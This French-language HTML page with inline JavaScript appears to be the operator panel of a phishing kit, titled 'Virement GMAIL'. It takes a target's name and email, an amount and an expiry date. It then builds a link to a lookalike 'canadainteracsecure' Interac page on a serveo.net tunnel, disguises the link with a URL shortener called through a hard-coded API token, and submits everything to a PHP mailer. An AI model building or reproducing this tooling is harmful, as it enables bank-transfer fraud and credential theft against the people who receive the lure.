<!DOCTYPE html>
<html lang="fr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Formulaire d'envoi vers GMAIL</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: #f4f4f4;
        }
        .container {
            max-width: 600px;
            margin: auto;
            padding: 20px;
            background: #fff;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0,0,0,0.1);
        }
        h1 {
            margin-top: 0;
        }
        label {
            display: block;
            margin: 10px 0 5px;
        }
        input[type="text"],
        input[type="url"] {
            width: 100%;
            padding: 8px;
            margin-bottom: 10px;
            border: 1px solid #ddd;
            border-radius: 4px;
        }
        button {
            padding: 10px 20px;
            background-color: #007BFF;
            color: #fff;
            border: none;
            border-radius: 4px;
            cursor: pointer;
        }
        button:hover {
            background-color: #0056b3;
        }
        .link-preview {
            margin-top: 20px;
            font-size: 16px;
        }
        .link-preview a {
            color: #007BFF;
            text-decoration: none;
        }
        .link-preview a:hover {
            text-decoration: underline;
        }
    </style>
    <script>
        function generateLink() {
            var client = document.getElementById('client').value;
            var montant = document.getElementById('montant').value;
            var myname = document.getElementById('myname').value;
            var exp = document.getElementById('exp').value;
            var baseUrl = 'https://canadainteracsecure.serveo.net//interac.php?';
            var url = baseUrl + 'montant=' + encodeURIComponent(montant) + '&exp=' + encodeURIComponent(exp) + '&nom=' + encodeURIComponent(myname);

            // Update the URL field with the generated link
            document.getElementById('url').value = url;
        }

        async function shortenLink() {
            const apiUrl = "https://api.t.ly/api/v1/link/shorten";
            const apiToken = "7LvCbVaQYR6durZcMHvqsTQpCXQNLXinXJPz5jeoF95rkTQVnM1AaSjPHbEN";

            const data = {
                long_url: document.getElementById('url').value,
                domain: "https://t.ly/",
                expire_at_datetime: "2035-01-17 15:00:00",
                description: "Lien personnalisé",
                public_stats: true
            };

            try {
                const response = await fetch(apiUrl, {
                    method: "POST",
                    headers: {
                        "Authorization": `Bearer ${apiToken}`,
                        "Content-Type": "application/json",
                        "Accept": "application/json"
                    },
                    body: JSON.stringify(data)
                });

                const result = await response.json();

                if (response.ok) {
                    alert('Lien raccourci : ' + result.short_url);
                    document.getElementById('url').value = result.short_url;
                } else {
                    alert('Erreur : ' + result.message);
                }
            } catch (error) {
                alert('Erreur lors de la requête : ' + error.message);
            }
        }
    </script>
</head>
<body>
    <div class="container">
        <h1>Virement GMAIL</h1>
        <form action="process2.php" method="post">
            <label for="client">Nom du Client:</label>
            <input type="text" id="client" name="client" required>

            <label for="email">Email du Client:</label>
            <input type="text" id="email" name="email" required>

            <label for="myname">Votre Nom:</label>
            <input type="text" id="myname" name="myname" required>

            <label for="montant">Montant:</label>
            <input type="text" id="montant" name="montant" required>

            <label for="exp">Date d'Expiration:</label>
            <input type="text" id="exp" name="exp" required>

            <label for="url">URL:</label>
            <input type="url" id="url" name="url" required>

            <button type="button" onclick="generateLink()">Générer le Lien</button>
            <button type="button" onclick="shortenLink()">Raccourcir le Lien</button>

            <button type="submit">Envoyer</button>
        </form>
    </div>
</body>
</html>
